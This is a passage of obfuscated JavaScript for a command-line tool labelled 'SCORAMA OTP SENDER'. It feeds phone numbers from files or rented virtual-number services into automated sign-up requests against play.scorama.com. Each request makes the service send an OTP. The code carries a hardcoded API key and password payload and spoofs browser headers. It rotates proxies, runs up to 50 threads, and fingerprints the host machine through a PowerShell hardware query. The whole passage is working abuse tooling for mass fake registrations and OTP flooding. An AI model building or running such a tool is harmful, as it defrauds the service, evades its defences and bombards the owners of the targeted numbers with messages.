    v213.hostname = v210.hostname, v213.path = v210.pathname + v210.search, v213.method = v203;
    v213.headers = v212, v213.timeout = v207;
    const v214 = v213;
    if (v206) {
      if (isNaN(v206.port) || v206.port <= 0x0) return v209(new Error("Invalid proxy"));
      v214.agent = mkAgent(v206);
    }
    const v215 = https.request(v214, v216 => {
      const v217 = [];
      v216.on("data", v218 => v217.push(v218)), v216.on("error", v209);
      v216.on("end", () => {
        let v219 = Buffer.concat(v217);
        const v220 = v216.headers["content-encoding"];
        if (v220 === "gzip") try {
          v219 = zlib.gunzipSync(v219);
        } catch (v221) {} else {
          if (v220 === "deflate") try {
            v219 = zlib.inflateSync(v219);
          } catch (v222) {} else {
            if (v220 === 'br') try {
              v219 = zlib.brotliDecompressSync(v219);
            } catch (v223) {}
          }
        }
        v208({
          'status': v216.statusCode,
          'data': v219.toString("utf8"),
          'headers': v216.headers
        });
      });
    });
    v215.on("error", v209), v215.on("timeout", () => {
      v215.destroy();
      v209(new Error("timeout"));
    });
    if (v205) v215.write(v205);
    v215.end();
  });
}
function randUsername() {
  const v224 = ["cool", "fast", "pro", "mega", "top", "star", "epic", "ace", "king", "fire", "ice", "dark", "red", "blue", "gold", "max", "zen", "neo", "sky", "nova"],
    v225 = ["player", "gamer", "hawk", "wolf", "fox", "lion", "bear", "eagle", "tiger", "shark", "bolt", "storm", "blaze", "rider", "hunter", "ninja", "boss", "chief", "duke", "knight"],
    v226 = v224[Math.floor(Math.random() * v224.length)],
    v227 = v225[Math.floor(Math.random() * v225.length)],
    v228 = Math.floor(Math.random() * 0x2328) + 0x3e8;
  return v226 + v227 + v228;
}
function formatPhone(v229) {
  let v230 = String(v229 || '').trim();
  if (v230.includes(':')) {
    const v231 = v230.split(':');
    v230 = v231[v231.length - 0x1].trim();
  }
  v230 = v230.replace(/[^0-9+]/g, '');
  if (!v230.startsWith('+')) v230 = '+' + v230;
  return v230;
}
async function triggerOTP(v232, v233 = {}) {
  const {
      onStatus: v234,
      proxy: v235,
      retries = 0x2
    } = v233,
    v236 = getRandomClient(),
    v237 = v235 ? rotateSessionId(parseProxy(v235)) : null,
    v238 = formatPhone(v232),
    v239 = v238,
    v240 = {};
  v240.Accept = "application/json, text/plain, */*", v240["Accept-Language"] = "en-NG", v240["Content-Type"] = "application/json", v240.Origin = "https://play.scorama.com", v240.Referer = "https://play.scorama.com/";
  v240["User-Agent"] = v236.ua, v240["x-api-key"] = "J9xowBQZM980G97zv9VoB9Ylady1pVtS5Ix9tuL1", v240["Sec-Ch-Ua"] = "\"Google Chrome\";v=\"" + v236.cv + "\", \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"" + v236.cv + '\x22';
  v240["Sec-Ch-Ua-Mobile"] = '?0', v240["Sec-Ch-Ua-Platform"] = "\"Windows\"";
  v240["Sec-Fetch-Dest"] = "empty", v240["Sec-Fetch-Mode"] = "cors", v240["Sec-Fetch-Site"] = "cross-site";
  const v241 = v240;
  for (let v243 = 0x0; v243 <= retries; v243++) {
    try {
      v243 > 0x0 && (v234 && v234("Retry " + v243 + '/' + retries), await new Promise(v251 => setTimeout(v251, 0x3e8 + Math.random() * 0x5dc)));
      const v244 = randUsername();
      v234 && v234("Checking username " + v244 + "...");
      const v245 = {};
      v245.type = "username", v245.field = v244;
      const v246 = await sendRequest("https://do0qiw7qe7s4l.cloudfront.net/users/v1/availability", "POST", v241, JSON.stringify(v245), v237, 0x4e20);
      debugLog(v239, "username-check", v246.status + " | " + v246.data);
      let v247;
      try {
        v247 = JSON.parse(v246.data);
      } catch (v252) {}
      if (v246.status !== 0xc8 || !v247?.["success"]) throw new Error("Username check failed (HTTP " + v246.status + ')');
      v234 && v234("Sending OTP to " + v238 + "...");
      const v248 = JSON.stringify({
          'phone_number': v238,
          'user_name': v247.data?.["available"] ? v244 : randUsername() + Math.floor(Math.random() * 0x64),
          'password': "GZuCOJRWH6LYrBAPA8tdf08OZ97FuyQlTq30smqjzdDup8OXQpebNZd4YUC0Dw9XjxbniBX4fbyF30B66kJtAVcNa06XHTmUqpmF3p/PynT8B+ZmVd9xlWj1e0qDCpS6S5SHT3j13rrZTSzj9E0dyKD5mVjJOdmvFIvoMX/A/T2+EeffZaooytvqMGkqhTbiBz+d8Zm473b+QcAlEhrwOseMOel421387jj8e61pbapjszdm7L/8i6+pGS+UtjR0yNQxKW+5f1rRPpihac7onnI0ZfrXf+p8LgV58BYU9mWc0iJGho2ZGn1+qOuARLbEo6AAn632eUIxWZllJ3nJYcfR5j/L/AfVvj3JczlhICl4ukMHHBsEVZLNpz5TunlYeCmRFuzEzyz+5GFF4YQ8T99yIQN1JLeNeKCWJFZiVtkqy8elkhWu70XFiX7NOFTiUP3SxtsAQKF/nzHG9YS2eGkWDqHg8t4ffhGRc7KWCf/Gh4uGr891KUrCfOJAcUOIM8QvX+WlejvN+FcDZByiyI7usl+0iw3CTpNnTON+XRef3rPX1yTvuEzDfaTeHFnwQOx4FWNJib7NYcdnigxTWc/PwAZu6KbnV26XEPC8EYsJnAUzuMmIfKLeehs3tltZC+BLV9okoj3xzkYI//dkGITEL+gPLjniWnbQW15oNJM=",
          'registration_state': "common",
          'encrypted': true
        }),
        v249 = await sendRequest("https://do0qiw7qe7s4l.cloudfront.net/onboarding/v1/account/sign-up", "POST", v241, v248, v237, 0x7530);
      debugLog(v239, "signup-response", v249.status + " | " + v249.data);
      let v250;
      try {
        v250 = JSON.parse(v249.data);
      } catch (v253) {}
      if (v249.status === 0xc8 && v250?.["success"] && v250?.["data"]?.["phone_otp_sent"]) {
        const v254 = {};
        return v254.success = true, v254.phone = v238, v254.username = v244, v254.message = "OTP sent", v254;
      }
      if (v249.status === 0xc8 && v250?.["success"] && v250?.["data"]?.["next_step"] === "verification") {
        const v255 = {};
        return v255.success = true, v255.phone = v238, v255.username = v244, v255.message = "OTP sent (verification pending)", v255;
      }
      if (v250?.["msg_code"] === "error.phone_already_exists" || v250?.["msg_code"] === "error.user_already_exists") {
        const v256 = {};
        return v256.success = false, v256.phone = v238, v256.message = v250?.["message"] || "Phone already registered", v256.fatal = true, v256;
      }
      if (v249.status === 0x190 || v249.status === 0x1a6) throw new Error("Signup rejected: " + (v250?.["message"] || "HTTP " + v249.status));
      throw new Error("Unexpected response: HTTP " + v249.status + " — " + (v250?.["message"] || v249.data.slice(0x0, 0x64)));
    } catch (v257) {
      debugLog(v239, "attempt-error", "attempt=" + v243 + " | " + v257.message);
      if (v243 >= retries) {
        const v258 = {};
        return v258.success = false, v258.phone = v238, v258.message = v257.message, v258;
      }
    }
  }
  const v242 = {};
  return v242.success = false, v242.phone = v238, v242.message = "All retries exhausted", v242;
}
class Dashboard {
  constructor(v259) {
    {
      this.totalNumbers = v259;
      this.processed = 0x0;
      this.successful = 0x0;
      this.failed = 0x0;
      this.startTime = Date.now();
      this.lastStatus = '';
      this.logs = [];
    }
  }
  ["addLog"](v260, v261) {
    let v262 = '';
    if (v261 === "success") v262 = chalk.hex("#00C9A7").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00C9A7")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v260.replace("Triggered OTP for ", ''));else {
      if (v261 === "retry") v262 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v260);else {
        const v263 = v260.match(/\+?\d{7,}/),
          v264 = v263 ? v263[0x0] : '',
          v265 = v260.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
        v262 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v264 ? '' + v264 : '') + chalk.hex("#555555")(v264 ? " → " : '') + chalk.hex("#888888")(v265);
      }
    }
    process.stdout.write("\r[K" + v262 + '\x0a'), this.render();
  }
  ["setStatus"](v266) {
    this.lastStatus = v266;
  }
  ["render"]() {
    const v267 = this.processed / Math.max(this.totalNumbers, 0x1),
      v268 = (v267 * 0x64).toFixed(0x1),
      v269 = Math.round(v267 * 0x14),
      v270 = 0x14 - v269,
      v271 = chalk.hex("#00C9A7")('█'.repeat(v269)) + chalk.hex("#333333")('░'.repeat(v270)),
      v272 = '\x20\x20' + chalk.hex("#00C9A7").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v271 + chalk.hex("#888888")('\x20' + v268 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
    process.stdout.write("\r[K" + v272);
  }
  ["stop"]() {
    process.stdout.write("[2K\r\n");
    const v273 = Math.floor((Date.now() - this.startTime) / 0x3e8);
    const v274 = Math.floor(v273 / 0x3c),
      v275 = v273 % 0x3c,
      v276 = v274 + 'm\x20' + v275 + 's';
    console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  SCORAMA OTP SENDER — COMPLETE             ") + C('║'));
    console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v276.padEnd(0x6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
  }
}
async function selectOption(v277, v278) {
  return new Promise(v279 => {
    let v280 = 0x0;
    process.stdin.resume();
    readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn4 = () => {
      process.stdout.write("[2J[H"), printHeader();
      console.log("   [33m" + v277 + "[0m\n");
      v278.forEach((v281, v282) => {
        v282 === v280 ? console.log("   [36m➔[35m " + v281.name + "[0m") : console.log("     [90m" + v281.name + "[0m");
      });
    };
    fn4();
    const fn5 = (v283, v284) => {
      if (v284.ctrl && v284.name === 'c') process.exit(0x0);
      if (v284.name === 'up') v280 = (v280 - 0x1 + v278.length) % v278.length, fn4();else {
        if (v284.name === "down") v280 = (v280 + 0x1) % v278.length, fn4();else {
          if (v284.name === "return") {
            if (process.stdin.isTTY) process.stdin.setRawMode(false);
            process.stdin.removeListener("keypress", fn5), v279(v278[v280].value);
          }
        }
      }
    };
    process.stdin.on("keypress", fn5);
  });
}
async function promptText(v285, v286 = '') {
  return new Promise(v287 => {
    process.stdout.write("   [33m" + v285 + "[0m ");
    let v288 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn6 = v289 => {
      const v290 = v289.toString();
      if (v290.includes('\x0a') || v290.includes('\x0d')) {
        process.stdin.removeListener("data", fn6), v288 += v290.split(/[\r\n]/)[0x0];
        let v291 = v288.trim();
        if (v291.startsWith('\x22') && v291.endsWith('\x22')) v291 = v291.slice(0x1, -1);
        v287(v291 || v286);
      } else v288 += v290;
    };
    process.stdin.on("data", fn6);
  });
}
async function interactiveWizard() {
  let v292 = 0x1;
  let v293 = "file",
    v294 = "numbers.txt",
    v295 = null;
  let v296 = null,
    v297 = null,
    v298 = null,
    v299 = null,
    v300 = "none";
  let v301 = 0xa;
  let v302 = 0x2;
  const v303 = path.join(__dirname, ".nexa_api_key");
  while (true) {
    process.stdout.write("[2J[H"), printHeader();
    if (v292 === 0x1) {
      const v304 = {};
      v304.name = "📁 Load from file (numbers.txt)", v304.value = "file";
      const v305 = {};
      v305.name = "📱 Enter single phone number", v305.value = "single";
      const v306 = {};
      v306.name = "🌐 Auto fetch from NexaOTP Panel", v306.value = "nexa";
      const v307 = {};
      v307.name = "⚡ Auto fetch from Voltx (2oo9)", v307.value = "voltx";
      const v308 = {};
      v308.name = "🔥 Auto fetch from Stex (2oo9)", v308.value = "stex";
      const v309 = {};
      v309.name = "📱 Auto fetch from SMS Bower", v309.value = "smsbower";
      const v310 = {};
      v310.name = "⚡ Auto fetch from Zenex", v310.value = "zenex";
      const v311 = {};
      v311.name = "❌ Exit Program", v311.value = "exit";
      const v312 = await selectOption("SELECT NUMBER SOURCE", [v304, v305, v306, v307, v308, v309, v310, v311]);
      if (v312 === "exit") process.exit(0x0);
      v293 = v312, v292 = 0x2;
    } else {
      if (v292 === 0x2) {
        if (v293 === "single") {
          const v313 = await promptText("Enter Phone Number (e.g. +2348012345678):", '');
          if (v313.toLowerCase() === "back" || !v313) {
            v292 = 0x1;
            continue;
          }
          v295 = v313.trim(), v292 = 0x3;
        } else {
          if (v293 === "voltx" || v293 === "stex") {
            const v314 = v293 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
              v315 = v293 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
              v316 = v293 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
              v317 = v293 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
            let v318 = '',
              v319 = [],
              v320 = 0x32,
              v321 = false,
              v322 = 0x1;
            while (v322 <= 0x3 && !v321) {
              process.stdout.write("[2J[H"), printHeader();
              if (v322 === 0x1) {
                if (fs.existsSync(v315)) {
                  v318 = fs.readFileSync(v315, "utf8").trim();
                  const v323 = {};
                  v323.name = "Use saved key", v323.value = "use";
                  const v324 = {};
                  v324.name = "Enter new key", v324.value = "new";
                  const v325 = {};
                  v325.name = "Remove saved key", v325.value = "remove";
                  const v326 = {};
                  v326.name = "⬅️ Back", v326.value = "back";
                  const v327 = await selectOption(v314 + " key found (" + v318.substring(0x0, 0xa) + "...)", [v323, v324, v325, v326]);
                  if (v327 === "back") {
                    v321 = true;
                    break;
                  }
                  if (v327 === "remove") fs.existsSync(v315) && fs.unlinkSync(v315), v318 = '';else v327 === "new" && (v318 = '');
                }
                if (!v318) {
                  const v328 = await promptText("Enter " + v314 + " API Key (mauthapi):", '');
                  if (v328.toLowerCase() === "back") {
                    v321 = true;
                    break;
                  }
                  v318 = v328;
                  const v329 = {};
                  v329.name = 'No', v329.value = 'no';
                  const v330 = await selectOption("Save key?", [{
                    'name': "Yes",
                    'value': "yes"
                  }, v329]);
                  if (v330 === "yes" && v318) fs.writeFileSync(v315, v318, "utf8");
                }
                if (v318) v322 = 0x2;
              } else {
                if (v322 === 0x2) {
                  const v331 = await selectOption("How to select ranges?", [{
                    'name': "🔍 Auto Range Finder (scan console)",
                    'value': "auto"
                  }, {
                    'name': "✏️  Enter manually",
                    'value': "manual"
                  }, {
                    'name': "⬅️ Back",
                    'value': "back"
                  }]);
                  if (v331 === "back") {
                    v322 = 0x1;
                    continue;
                  }
                  if (v331 === "auto") {
                    const v332 = await autoRangeFinderFor2Oo(v318, v317, selectOption, promptText);
                    v332 && v332.length > 0x0 && (v319 = v332, v322 = 0x3);
                  } else {
                    v319 = [];
                    let v333 = true;
                    while (v333) {
                      const v334 = await promptText("Enter range #" + (v319.length + 0x1) + " (e.g. 23480XXX) or 'back':", '');
                      if (v334.toLowerCase() === "back") {
                        if (v319.length === 0x0) break;else {
                          v319.pop();
                          continue;
                        }
                      }
                      if (v334) v319.push(v334);
                      const v335 = {};
                      v335.name = "Yes", v335.value = "yes";
                      const v336 = {};
                      v336.name = 'No', v336.value = 'no';
                      const v337 = await selectOption("Added " + v319.length + ". Add another?", [v335, v336]);
                      if (v337 === 'no') v333 = false;
                    }
                    if (v319.length > 0x0) v322 = 0x3;
                  }
                } else {
                  if (v322 === 0x3) {
                    const v338 = await promptText("How many numbers? [default:50]:", '50');
                    if (v338.toLowerCase() === "back") {
                      v322 = 0x2;
                      continue;
                    }
                    v320 = parseInt(v338) || 0x32;
                    const v339 = {};
                    v339.provider = v293, v339.apiKey = v318, v339.getPath = v316, v339.consolePath = v317, v339.ranges = v319, v339.totalCount = v320, v299 = v339, v296 = null, v322 = 0x4;
                  }
                }
              }
            }
            if (v321) {
              v292 = 0x1;
              continue;
            }
            v292 = 0x3;
          } else {
            if (v293 === "smsbower") {
              let v340 = '',
                v341 = 'fb',
                v342 = '0',
                v343 = "0.5",
                v344 = 0x32,
                v345 = 0x1,
                v346 = false;
              while (v345 <= 0x4 && !v346) {
                process.stdout.write("[2J[H"), printHeader();
                if (v345 === 0x1) {
                  if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                    v340 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                    const v347 = {};
                    v347.name = "Use saved key", v347.value = "use";
                    const v348 = {};
                    v348.name = "Enter new key", v348.value = "new";
                    const v349 = {};
                    v349.name = "Remove saved key", v349.value = "remove";
                    const v350 = {};
                    v350.name = "⬅️ Back", v350.value = "back";
                    const v351 = await selectOption("SMS Bower key found (" + v340.substring(0x0, 0xa) + "...)", [v347, v348, v349, v350]);
                    if (v351 === "back") {
                      v346 = true;
                      break;
                    }
                    if (v351 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v340 = '';else {
                      if (v351 === "new") v340 = '';
                    }
                  }
                  if (!v340) {
                    v340 = await promptText("Enter SMS Bower API Key:", '');
                    if (v340.toLowerCase() === "back") {
                      v346 = true;
                      break;
                    }
                    const v352 = {};
                    v352.name = 'No', v352.value = 'no';
                    const v353 = await selectOption("Save key?", [{
                      'name': "Yes",
                      'value': "yes"
                    }, v352]);
                    if (v353 === "yes" && v340) fs.writeFileSync(SMSBOWER_KEY_FILE, v340, "utf8");
                  }
                  if (v340) v345 = 0x2;
                } else {
                  if (v345 === 0x2) {
                    v341 = await promptText("Service code [default: fb]:", 'fb');
                    if (v341.toLowerCase() === "back") {
                      v345 = 0x1;
                      continue;
                    }
                    v341 = v341 || 'fb', v345 = 0x3;
                  } else {
                    if (v345 === 0x3) {
                      v342 = await promptText("Country code (0 = any) [default: 0]:", '0');
                      if (v342.toLowerCase() === "back") {
                        v345 = 0x2;
                        continue;
                      }
                      v342 = v342 || '0';
                      const v354 = await promptText("Max price per number [default: 0.5]:", "0.5");
                      v343 = v354 || "0.5", v345 = 0x4;
                    } else {
                      if (v345 === 0x4) {
                        const v355 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v355.toLowerCase() === "back") {
                          v345 = 0x3;
                          continue;
                        }
                        v344 = parseInt(v355) || 0x32;
                        const v356 = {};
                        v356.apiKey = v340, v356.service = v341, v356.country = v342, v356.maxPrice = v343, v356.totalCount = v344, v297 = v356, v296 = null, v299 = null, v298 = null, v345 = 0x5;
                      }
                    }
                  }
                }
              }
              if (v346) {
                v292 = 0x1;
                continue;
              }
              v292 = 0x3;
            } else {
              if (v293 === "zenex") {
                let v357 = '',
                  v358 = [],
                  v359 = 0x32,
                  v360 = 0x1,
                  v361 = false;
                while (v360 <= 0x3 && !v361) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v360 === 0x1) {
                    if (fs.existsSync(ZENEX_KEY_FILE)) {
                      v357 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                      const v362 = {};
                      v362.name = "Enter new key", v362.value = "new";
                      const v363 = {};
                      v363.name = "⬅️ Back", v363.value = "back";
                      const v364 = await selectOption("Zenex key found (" + v357.substring(0x0, 0xa) + "...)", [{
                        'name': "Use saved key",
                        'value': "use"
                      }, v362, {
                        'name': "Remove saved key",
                        'value': "remove"
                      }, v363]);
                      if (v364 === "back") {
                        v361 = true;
                        break;
                      }
                      if (v364 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v357 = '';else {
                        if (v364 === "new") v357 = '';
                      }
                    }
                    if (!v357) {
                      v357 = await promptText("Enter Zenex API Key (mapikey):", '');
                      if (v357.toLowerCase() === "back") {
                        v361 = true;
                        break;
                      }
                      const v365 = {};
                      v365.name = "Yes", v365.value = "yes";
                      const v366 = {};
                      v366.name = 'No', v366.value = 'no';
                      const v367 = await selectOption("Save key?", [v365, v366]);
                      if (v367 === "yes" && v357) fs.writeFileSync(ZENEX_KEY_FILE, v357, "utf8");
                    }
                    if (v357) v360 = 0x2;
                  } else {
                    if (v360 === 0x2) {
                      v358 = [];
                      let v368 = true;
                      while (v368) {
                        const v369 = await promptText("Enter range #" + (v358.length + 0x1) + " (e.g. 23480XXX) or 'back':", '');
                        if (v369.toLowerCase() === "back") {
                          if (v358.length === 0x0) {
                            v361 = true;
                            break;
                          } else {
                            v358.pop();
                            continue;
                          }
                        }
                        if (v369) v358.push(v369);
                        const v370 = {};
                        v370.name = "Yes", v370.value = "yes";
                        const v371 = {};
                        v371.name = 'No', v371.value = 'no';
                        const v372 = await selectOption("Added " + v358.length + ". Add another?", [v370, v371]);
                        if (v372 === 'no') v368 = false;
                      }
                      if (v358.length > 0x0) v360 = 0x3;
                    } else {
                      if (v360 === 0x3) {
                        const v373 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v373.toLowerCase() === "back") {
                          v360 = 0x2;
                          continue;
                        }
                        v359 = parseInt(v373) || 0x32;
                        const v374 = {};
                        v374.apiKey = v357, v374.ranges = v358, v374.totalCount = v359, v298 = v374, v296 = null, v299 = null, v297 = null, v360 = 0x4;
                      }
                    }
                  }
                }
                if (v361) {
                  v292 = 0x1;
                  continue;
                }
                v292 = 0x3;
              } else {
                if (v293 === "file") {
                  const v375 = {};
                  v375.name = "⬅️ Go Back to Number Source", v375.value = "back";
                  const v376 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                    'name': "✏️ Custom File Path",
                    'value': "custom"
                  }, v375]);
                  if (v376 === "back") {
                    v292 = 0x1;
                    continue;
                  }
                  if (v376 === "custom") {
                    const v377 = await promptText("Enter Numbers File Path:", "numbers.txt");
                    if (v377.toLowerCase() === "back") continue;
                    v294 = v377;
                  } else v294 = v376;
                  if (!fs.existsSync(v294)) {
                    const v378 = [path.join(__dirname, "numbers.txt"), path.join(__dirname, "phone.txt"), path.join(__dirname, '..', '..', "User", "numbers.txt")].find(v379 => fs.existsSync(v379));
                    if (v378) v294 = v378;else fs.writeFileSync(v294, '');
                  }
                  v296 = null, v292 = 0x3;
                } else {
                  let v380 = 0x1,
                    v381 = false,
                    v382 = '',
                    v383 = [],
                    v384 = 0x32,
                    v385 = "/api/v1/numbers/get";
                  while (v380 <= 0x4 && !v381) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v380 === 0x1) {
                      if (fs.existsSync(v303)) {
                        const v386 = fs.readFileSync(v303, "utf8").trim(),
                          v387 = {};
                        v387.name = "Yes, use saved key", v387.value = "yes";
                        const v388 = {};
                        v388.name = "No, enter new key", v388.value = 'no';
                        const v389 = {};
                        v389.name = "Delete saved key", v389.value = "delete";
                        const v390 = {};
                        v390.name = "⬅️ Go Back", v390.value = "back";
                        const v391 = await selectOption("Found saved API Key (..." + v386.slice(-4) + "). Use it?", [v387, v388, v389, v390]);
                        if (v391 === "back") {
                          v381 = true;
                          break;
                        }
                        if (v391 === "yes") v382 = v386;else {
                          if (v391 === "delete") {
                            try {
                              fs.unlinkSync(v303);
                            } catch (v392) {}
                            v382 = '';
                          }
                        }
                      }
                      if (!v382) {
                        const v393 = await promptText("Enter NexaOTP API Key:", '');
                        if (v393.toLowerCase() === "back") {
                          v381 = true;
                          break;
                        }
                        v382 = v393;
                        const v394 = {};
                        v394.name = 'No', v394.value = 'no';
                        const v395 = await selectOption("Save key?", [{
                          'name': "Yes",
                          'value': "yes"
                        }, v394]);
                        if (v395 === "yes" && v382) fs.writeFileSync(v303, v382, "utf8");
                      }
                      if (v382) v380 = 0x2;
                    } else {
                      if (v380 === 0x2) {
                        v383 = [];
                        let v396 = true;
                        while (v396) {
                          const v397 = await promptText("Enter range #" + (v383.length + 0x1) + " (e.g. 23480XXX) or 'back':", '');
                          if (v397.toLowerCase() === "back") {
                            if (v383.length === 0x0) {
                              v380 = 0x1;
                              break;
                            } else {
                              v383.pop();
                              continue;
                            }
                          }
                          if (v397) v383.push(v397);
                          const v398 = {};
                          v398.name = "Yes", v398.value = "yes";
                          const v399 = {};
                          v399.name = 'No', v399.value = 'no';
                          const v400 = await selectOption("Added " + v383.length + ". Add another?", [v398, v399]);
                          if (v400 === 'no') v396 = false;
                        }
                        if (v383.length > 0x0) v380 = 0x3;
                      } else {
                        if (v380 === 0x3) {
                          const v401 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v401.toLowerCase() === "back") {
                            v380 = 0x2;
                            continue;
                          }
                          v384 = parseInt(v401) || 0x32, v380 = 0x4;
                        } else {
                          if (v380 === 0x4) {
                            const v402 = {};
                            v402.name = "Server 1 (/get)", v402.value = "/api/v1/numbers/get";
                            const v403 = {};
                            v403.name = "Server 2 (/p2/get)", v403.value = "/api/v1/numbers/p2/get";
                            const v404 = {};
                            v404.name = "Server 3 (/p3/get)", v404.value = "/api/v1/numbers/p3/get";
                            const v405 = {};
                            v405.name = "⬅️ Go Back", v405.value = "back";
                            const v406 = await selectOption("SELECT NEXA SERVER", [v402, v403, v404, v405]);
                            if (v406 === "back") {
                              v380 = 0x3;
                              continue;
                            }
                            v385 = v406;
                            const v407 = {};
                            v407.apiKey = v382, v407.ranges = v383, v407.totalCount = v384, v407.serverEndpoint = v385, v296 = v407, v380 = 0x5;
                          }
                        }
                      }
                    }
                  }
                  if (v381) {
                    v292 = 0x1;
                    continue;
                  }
                  v292 = 0x3;
                }
              }
            }
          }
        }
      } else {
        if (v292 === 0x3) {
          const v408 = await selectOption("SELECT PROXY MODE", [{
            'name': "📁 Enter Proxies File Path",
            'value': "custom"
          }, {
            'name': "🚫 None (Direct Connection)",
            'value': "none"
          }, {
            'name': "⬅️ Go Back to Numbers Selection",
            'value': "back"
          }]);
          if (v408 === "back") {
            v292 = 0x2;
            continue;
          }
          if (v408 === "custom") {
            const v409 = await promptText("Enter Proxies File Path (or 'back'):", "proxies.txt");
            if (v409.toLowerCase() === "back" || !v409.trim()) continue;
            let v410 = v409.replace(/^["']|["']$/g, '').trim();
            if (!fs.existsSync(v410)) {
              console.log(R("\n  ✗ File not found: " + v410 + '\x0a')), await new Promise(v411 => setTimeout(v411, 0x5dc));
              continue;
            }
            v300 = v410;
          } else v408 === "none" && (v300 = '');
          v292 = 0x4;
        } else {
          if (v292 === 0x4) {
            const v412 = {};
            v412.name = "50 Threads (Extreme)", v412.value = 0x32;
            const v413 = {};
            v413.name = "⌨️ Custom...", v413.value = "custom";
            const v414 = await selectOption("SELECT THREADS", [{
              'name': "10 Threads (Default)",
              'value': 0xa
            }, {
              'name': "20 Threads (Fast)",
              'value': 0x14
            }, v412, v413, {
              'name': "⬅️ Go Back to Proxies Selection",
              'value': "back"
            }]);
            if (v414 === "back") {
              v292 = 0x3;
              continue;
            }
            if (v414 === "custom") {
              const v415 = await promptText("Enter custom threads (1-50):", '10');
              if (v415.toLowerCase() === "back") continue;
              v301 = Math.min(Math.max(parseInt(v415) || 0xa, 0x1), 0x32);
            } else v301 = v414;
            v292 = 0x5;
          } else {
            if (v292 === 0x5) {
              const v416 = {};
              v416.name = "1 Retry", v416.value = 0x1;
              const v417 = {};
              v417.name = "3 Retries", v417.value = 0x3;
              const v418 = await selectOption("SELECT RETRIES PER NUMBER", [{
                'name': "2 Retries (Default)",
                'value': 0x2
              }, v416, v417, {
                'name': "0 Retries (Skip on fail)",
                'value': 0x0
              }, {
                'name': "⬅️ Go Back to Threads Selection",
                'value': "back"
              }]);
              if (v418 === "back") {
                v292 = 0x4;
                continue;
              }
              v302 = v418, v292 = 0x6;
            } else {
              if (v292 === 0x6) break;
            }
          }
        }
      }
    }
  }
  return process.stdin.pause(), {
    'numbersFile': v294,
    'threads': String(v301),
    'proxiesFile': v300,
    'singleNumber': v295,
    'nexaConfig': v296,
    'twoOoConfig': v299,
    'smsBowerConfig': v297,
    'zenexConfig': v298,
    'retries': v302
  };
}
function generateHWID() {
  const v419 = require('os');
  const v420 = v419.platform();
  try {
    if (v420 === "win32") {
      const v421 = {};
      v421.stdio = "pipe", v421.timeout = 0x3a98;
      const v422 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', v421).toString().trim();
      if (!v422) throw new Error("No hardware data");
      const v423 = crypto.createHash("sha256").update(v422).digest("hex").toUpperCase();
      return "SKING-" + v423.substring(0x0, 0x8) + '-' + v423.substring(0x8, 0xc) + '-' + v423.substring(0xc, 0x10);
    } else {
      let v424 = [];
      try {
        const v428 = {};
        v428.stdio = "pipe", v428.timeout = 0x1388;
        const v429 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v428).toString().trim();
        if (v429 && v429 !== "null") v424.push('A:' + v429);
      } catch (v430) {}
      try {
        if (fs.existsSync("/proc/cpuinfo")) {
          const v431 = fs.readFileSync("/proc/cpuinfo", "utf8"),
            v432 = v431.match(/Serial\s*:\s*(\S+)/i),
            v433 = v431.match(/Hardware\s*:\s*(.+)/i);
          if (v432 && v432[0x1] !== "0000000000000000") v424.push('S:' + v432[0x1].trim());
